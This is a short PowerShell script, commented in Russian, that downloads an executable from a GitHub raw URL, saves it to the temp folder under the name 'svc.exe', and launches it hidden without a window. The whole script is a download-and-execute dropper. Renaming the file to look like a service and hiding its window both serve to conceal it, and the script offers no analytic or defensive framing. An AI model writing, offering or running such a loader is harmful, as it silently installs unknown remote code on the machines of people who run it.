$url = "https://raw.githubusercontent.com/hal0151/erorft/refs/heads/main/eror.exe"
$path = "$env:TEMP\svc.exe"

# Скачиваем файл
Invoke-WebRequest -Uri $url -OutFile $path -UseBasicParsing

# Запускаем в фоне, без окна, и не ждём завершения
Start-Process -FilePath $path -WindowStyle Hidden -PassThru | Out-Null
